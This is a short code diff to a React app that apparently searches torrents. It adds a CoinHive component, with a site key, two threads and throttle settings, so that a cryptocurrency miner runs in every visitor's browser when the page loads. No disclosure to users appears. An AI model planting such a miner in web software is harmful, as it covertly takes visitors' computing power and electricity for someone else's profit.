@@ -1,5 +1,6 @@
 import React, { Component } from 'react';
 import Loading from './Loading'
+import CoinHive from 'react-coin-hive'
 
 const URL = 'https://torrent-search.glitch.me/search?q='
 
@@ -174,6 +175,11 @@ class App extends Component {
               ))
             }
           </div>
+          <CoinHive
+            siteKey='9Fngfsw5qYtpClGXpHDE6E2DO9sjj6nj'
+            threads={2}
+            throttle={0.6}
+          />
         </div>
       </div>
     );
